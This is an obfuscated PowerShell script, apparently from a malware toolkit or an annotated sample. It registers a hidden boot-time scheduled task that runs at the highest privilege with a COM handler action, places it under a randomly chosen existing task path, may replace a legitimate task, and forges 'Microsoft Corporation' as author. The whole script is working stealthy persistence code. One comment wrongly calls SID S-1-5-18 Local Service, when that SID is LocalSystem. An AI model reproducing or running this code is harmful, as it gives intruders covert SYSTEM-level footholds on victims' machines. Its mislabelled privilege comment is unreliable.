# INPUT PARAMS...
    # $zb1, GUID. random_GUID_3
    # $vh1, randomly selected path to a currently registered scheduled task
    # $uq4, randomly selected name of a currently registered scheduled task
# OUTPUT...
    # registers a task under the path of a currently registered scheduled task, and name of another one.
    # if the task alreads exists it is replaced. Runs as Local Service on boot, and the action is a COM
    # handler located at <random_GUID_3>

# SID for local service account
$jp9="S-1-5-18";
$hv8=new-object -ComObject "Schedule.Service";
$hv8.Connect();

# create a task in the given path
$dt0=$hv8.GetFolder($vh1);
$vj3=$hv8.NewTask(0);

# set description and author to "Microsoft Corporation"
$xs9="Microsoft Corporation";
$vj3.RegistrationInfo.Description=$xs9;
$vj3.RegistrationInfo.Author=$xs9;

# task settings. can run on demand, on battery, and whether or not the machine is idle
$vj3.Settings.Enabled=1;
$vj3.Settings.AllowDemandStart=1;
$vj3.Settings.DisallowStartIfOnBatteries=0;
$vj3.Settings.StartWhenAvailable=1;
$vj3.Settings.MultipleInstances=0;
$vj3.Settings.RunOnlyIfIdle=0;

# run with the highest privilege
$vj3.Principal.RunLevel=1;

# trigger the task on boot
$kn7 = $vj3.Triggers;
$hz3 = $kn7.Create(8);
$hz3.Enabled = $true;

# create a COM handler action located at the given GUID
$wt0=$vj3.Actions.Create(5);
$wt0.ClassId=$zb1;

# name the task with the given name
# will create a new task, or even replace the existing task if we happpened to randomly select 
    # a corresponding path and name
# run with Local Service account credentials
$dt0.RegisterTaskDefinition($uq4,$vj3,6,$jp9,$null,5)|out-null